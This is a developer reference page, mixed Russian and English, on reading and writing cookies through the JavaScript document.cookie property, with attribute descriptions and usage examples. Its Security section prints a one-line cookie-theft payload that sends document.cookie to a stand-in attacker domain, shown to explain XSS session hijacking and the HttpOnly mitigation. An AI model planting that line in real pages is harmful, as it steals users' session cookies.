---
title: Document.cookie
slug: Web/API/Document/cookie
---

{{APIRef("DOM")}}

Статья описывает получение и установку cookies связанных с текущим документом. Общая библиотека для работы с cookies смотри [simple cookie framework](/ru/docs/Web/API/Document/cookie/Simple_document.cookie_framework).

## Синтаксис

### Чтение всех cookies, связанных с текущим документом

```
allCookies = document.cookie;
```

In the code above _allCookies_ is a string containing a semicolon-separated list of all cookies (i.e. `key=value` pairs). Note that each _key_ and _value_ may be surrounded by whitespace (space and tab characters): in fact [RFC 6265](https://tools.ietf.org/html/rfc6265) mandates a single space after each semicolon, but some user agents may not abide by this.

### Запись новой cookie

```
document.cookie = newCookie;
```

В приведённом коде `newCookie` - строка в виде `key=value`_._ Заметьте, у вас есть возможность установить/обновить лишь одну связку `key=value` за один раз, используя этот метод. Стоит отметить, что:

- Any of the following cookie attribute values can optionally follow the key-value pair, specifying the cookie to set/update, and preceded by a semi-colon separator:

  - `;path=path` (e.g., '`/`', '`/mydir`') If not specified, defaults to the current path of the current document location.

    > **Примечание:** Prior to Gecko 6.0, paths with quotes were treated as if the quotes were part of the string, instead of as if they were delimiters surrounding the actual path string. This has been fixed.

    The path must be **absolute** (see [RFC 6265](https://tools.ietf.org/html/rfc6265)). For more information on how to use relative paths, see [this paragraph](/ru/docs/Web/API/Document/cookie#Using_relative_URLs_in_the_path_parameter).

  - `;domain=domain` (e.g., '`example.com`' or '`subdomain.example.com`'). If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.
  - `;max-age=max-age-in-seconds` (e.g., `60*60*24*365` or 31536000 for a year)
  - `;expires=date-in-GMTString-format` If neither `expires` nor `max-age`specified it will expire at the end of session.

    > **Предупреждение:** When user privacy is a concern, It is important that any web app implementation will invalidate cookie data after a certain timeout and won't rely on the browser clearing session cookies
    > One of the most beloved features of Firefox [prevents session cookies from ever expiring](https://bugzilla.mozilla.org/show_bug.cgi?id=345345).
    > The same [issue](https://code.google.com/p/chromium/issues/detail?id=128513) is also occuring with google chrome (and probably with other browsers offering similar features)

    - See {{jsxref("Date.toUTCString()")}} for help formatting this value.

  - `;secure` Cookie to only be transmitted over secure protocol as https. Before Chrome 52, this flag could appear with cookies from http domains.
  - `;samesite` [SameSite](/ru/docs/Web/HTTP/Cookies#SameSite_cookies) prevents the browser from sending this cookie along with cross-site requests. Possible values for the flag are `lax` or `strict`.

    - The `strict` value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link.
    - The `lax` value will only send cookies for TOP LEVEL navigation GET requests. This is sufficient for user tracking, but it will prevent many CSRF attacks.

- The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} to ensure that the string does not contain any commas, semicolons, or whitespace (which are disallowed in cookie values).
- Some user agent implementations support the following cookie prefixes:

  - `__Secure-` Signals to the browser that it should only include the cookie in requests transmitted over a secure channel.
  - `__Host-` Signals to the browser that in addition to the restriction to only use the cookie from a secure origin, the scope of the cookie is limited to a path attribute passed down by the server. If the server omits the path attribute the "directory" of the request URI is used. It also signals that the domain attribute must not be present, which prevents the cookie from being sent to other domains. For Chrome the path attribute must always be the origin.

  > **Примечание:** The dash is considered part of the prefix.

  > **Примечание:** These flags are only setable with the `secure` attribute.

> **Примечание:** As you can see from the code above, `document.cookie` is an [accessor property](/ru/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description) with native _setter_ and _getter_ functions, and consequently is **not** a [data property](/ru/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#Description) with a value: what you write is not the same as what you read, everything is always mediated by the JavaScript interpreter.

## Примеры

### Пример #1: Простое использование

```js
document.cookie = "name=oeschger";
document.cookie = "favorite_food=tripe";
function alertCookie() {
  alert(document.cookie);
}
```

```html
<button onclick="alertCookie()">Show cookies</button>
```

{{EmbedLiveSample('Пример_1_Простое_использование', 200, 36)}}

### Пример #2: Получить cookie с именем _test2_

```js
document.cookie = "test1=Hello";
document.cookie = "test2=World";

var cookieValue = document.cookie.replace(
  /(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/,
  "$1",
);

function alertCookieValue() {
  alert(cookieValue);
}
```

```html
<button onclick="alertCookieValue()">Show cookie value</button>
```

{{EmbedLiveSample('Пример_2_Получить_cookie_с_именем_test2', 200, 36)}}

### Пример #3: Выполнить операцию единожды

При использовании следующего кода замените все вхождения `doSomethingOnlyOnce` (наименование cookie) на другое имя.

```js
function doOnce() {
  if (
    document.cookie.replace(
      /(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/,
      "$1",
    ) !== "true"
  ) {
    alert("Do something here!");
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
  }
}
```

```html
<button onclick="doOnce()">Only do something once</button>
```

{{EmbedLiveSample('Пример_3_Выполнить_операцию_единожды', 200, 36)}}

### Пример #4: Перезагрузить cookie

```js
function resetOnce() {
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
}
```

```html
<button onclick="resetOnce()">Reset only once cookie</button>
```

{{EmbedLiveSample('Пример_4_Перезагрузить_cookie', 200, 36)}}

### Example #5: Проверить существование cookie

```
//ES5

if (document.cookie.split(';').filter(function(item) {
    return item.trim().indexOf('reader=') == 0
}).length) {
    console.log('The cookie "reader" exists (ES5)')
}

//ES2016

if (document.cookie.split(';').filter((item) => item.trim().startsWith('reader=')).length) {
    console.log('The cookie "reader" exists (ES6)')
}
```

### Example #6: Проверить, что cookie имеет определённое значение

```
//ES5

if (document.cookie.split(';').filter(function(item) {
    return item.indexOf('reader=1') >= 0
}).length) {
    console.log('The cookie "reader" has "1" for value')
}

//ES2016

if (document.cookie.split(';').filter((item) => item.includes('reader=1')).length) {
    console.log('The cookie "reader" has "1" for value')
}
```

## Безопасность

It is important to note that the path attribute does **not** protect against unauthorized reading of the cookie from a different path. It can be easily bypassed using the DOM, for example by creating a hidden [iframe](/ru/docs/HTML/Element/iframe) element with the path of the cookie, then accessing this iframe's `contentDocument.cookie` property. The only way to protect the cookie is by using a different domain or subdomain, due to the [same origin policy](/ru/docs/Same_origin_policy_for_JavaScript).

Cookies are often used in web application to identify a user and their authenticated session. So stealing cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -

```js
new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).

## Примечания

- Starting with Firefox 2, a better mechanism for client-side storage is available - [WHATWG DOM Storage](/ru/docs/DOM/Storage).
- You can delete a cookie by simply updating its expiration time to zero.
- Keep in mind that the more you have cookies the more data will be transferred between the server and the client for each request. This will make each request slower. It is highly recommended for you to use [WHATWG DOM Storage](/ru/docs/DOM/Storage) if you are going to keep "client-only" data.
- [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt) (Section 5.3, "Implementation Limits") specifies that there should be **no maximum length** of a cookie's key or value size, and encourages implementations to support **arbitrarily large cookies**. Each browser's implementation maximum will necessarily be different, so consult individual browser documentation.

The reason of the [syntax](#Syntax) of the `document.cookie` accessor property is due to the client-server nature of cookies, which differs from other client-client storage methods (like, for instance, [localStorage](/ru/docs/Web/Guide/API/DOM/Storage)):

##### The server tells the client to store a cookie

```
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: cookie_name1=cookie_value1
Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

[content of the page here]
```

##### The client sends back to the server its cookies previously stored

```
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
Accept: */*
```

### Использование относительных ссылок в параметре path

The [`path`](#new-cookie_path) parameter of a new cookie can accept only _absolute_ paths. If you want to use _relative_ paths, therefore, you need to convert them. The following function can translate _relative_ paths to _absolute_ paths. It is a general-purpose function, but can be of course successifully used for the [`path`](#new-cookie_path) parameter of a new cookie, as well.

##### Library

```js
/*\
|*|
|*|  :: Translate relative paths to absolute paths ::
|*|
|*|  https://developer.mozilla.org/ru/docs/Web/API/document.cookie
|*|  https://developer.mozilla.org/User:fusionchess
|*|
|*|  The following code is released under the GNU Public License, version 3 or later.
|*|  http://www.gnu.org/licenses/gpl-3.0-standalone.html
|*|
\*/

function relPathToAbs(sRelPath) {
  var nUpLn,
    sDir = "",
    sPath = location.pathname.replace(
      /[^\/]*$/,
      sRelPath.replace(/(\/|^)(?:\.?\/+)+/g, "$1"),
    );
  for (
    var nEnd, nStart = 0;
    (nEnd = sPath.indexOf("/../", nStart)), nEnd > -1;
    nStart = nEnd + nUpLn
  ) {
    nUpLn = /^\/(?:\.\.\/)*/.exec(sPath.slice(nEnd))[0].length;
    sDir = (sDir + sPath.substring(nStart, nEnd)).replace(
      new RegExp("(?:\\/+[^\\/]*){0," + (nUpLn - 1) / 3 + "}$"),
      "/",
    );
  }
  return sDir + sPath.substr(nStart);
}
```

##### Sample usage

```js
/* Let us be in /ru/docs/Web/API/document.cookie */

alert(location.pathname);
// displays: /ru/docs/Web/API/document.cookie

alert(relPathToAbs("./"));
// displays: /ru/docs/Web/API/

alert(relPathToAbs("../Guide/API/DOM/Storage"));
// displays: /ru/docs/Web/Guide/API/DOM/Storage

alert(relPathToAbs("../../Firefox"));
// displays: /ru/docs/Firefox

alert(relPathToAbs("../Guide/././API/../../../Firefox"));
// displays: /ru/docs/Firefox
```

### Относительный срок годности cookie: числовые примеры

If you don't want to use an _absolute date_ for the `end` parameter, here you can find some numeric examples of expiration-dates _relative to the moment of storage of the cookie_:

```js
docCookies.setItem("mycookie1", "myvalue1", 864e2, "/"); // this cookie will expire in one DAY
docCookies.setItem("mycookie2", "myvalue2", 6048e2, "/"); // this cookie will expire in one WEEK
docCookies.setItem("mycookie3", "myvalue3", 2592e3, "/"); // this cookie will expire in one MONTH (30 days)
docCookies.setItem("mycookie4", "myvalue4", 31536e3, "/"); // this cookie will expire in one YEAR
```

## Другие примеры

### Example #5: Do something only once – _a general library_

#### Библиотека

```
function executeOnce () {
  var argc = arguments.length, bImplGlob = typeof arguments[argc - 1] === "string";
  if (bImplGlob) { argc++; }
  if (argc < 3) { throw new TypeError("executeOnce - not enough arguments"); }
  var fExec = arguments[0], sKey = arguments[argc - 2];
  if (typeof fExec !== "function") { throw new TypeError("executeOnce - first argument must be a function"); }
  if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { throw new TypeError("executeOnce - invalid identifier"); }
  if (decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(sKey).replace(/[\-\.\+\*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) === "1") { return false; }
  fExec.apply(argc > 3 ? arguments[1] : null, argc > 4 ? Array.prototype.slice.call(arguments, 2, argc - 2) : []);
  document.cookie = encodeURIComponent(sKey) + "=1; expires=Fri, 31 Dec 9999 23:59:59 GMT" + (bImplGlob || !arguments[argc - 1] ? "; path=/" : "");
  return true;
}
```

#### Синтаксис

```
executeOnce(callback[, thisObject[, argumentToPass1[, argumentToPass2[, …[, argumentToPassN]]]]], identifier[, onlyHere])
```

#### Описание

Executes a function only once, even after the refresh of the page.

#### Параметры

- `callback`
  - : The function to be executed ({{jsxref("function", "", "", "1")}}).
- `thisObject` Optional
  - : The {{jsxref("Operators/this", "this")}} object ({{jsxref("Object", "", "", "1")}} or {{jsxref("Global_Objects/null", "null")}}).
- `argumentToPass1, argumentToPass2, argumentToPassN` Optional
  - : The arguments of the `callback` function.
- `identifier`
  - : The identifier to check, i.e. the name of the cookie ({{jsxref("String", "string", "", "1")}})
- `onlyHere` Optional
  - : A {{jsxref("Boolean", "boolean", "", "1")}} expressing whether the cookie will use the local path (`true`) instead of the global one (`false` or `undefined`) ({{jsxref("Boolean", "boolean", "", "1")}} or {{jsxref("Global_Objects/undefined", "undefined")}})

#### Примеры использования

```
function alertSomething (sMsg) {
  alert(sMsg);
}

executeOnce(alertSomething, null, "Hello world!!!!", "alert_something");
```

## Спецификации

{{Specifications}}

## Совместимость с браузерами

{{Compat}}

## Смотрите также

- [HTTP cookies](/ru/docs/Web/HTTP/Cookies)
- [DOM Storage](/ru/docs/Web/Guide/API/DOM/Storage)
- [`URLUtils.pathname`](/ru/docs/Web/API/URLUtils.pathname)
- {{jsxref("Date.toUTCString()")}}
- [`HTTP`](/ru/docs/Web/HTTP)
- [Cookies (code snippets)](/ru/docs/Code_snippets/Cookies)
- [RFC 2965](http://www.ietf.org/rfc/rfc2965.txt)
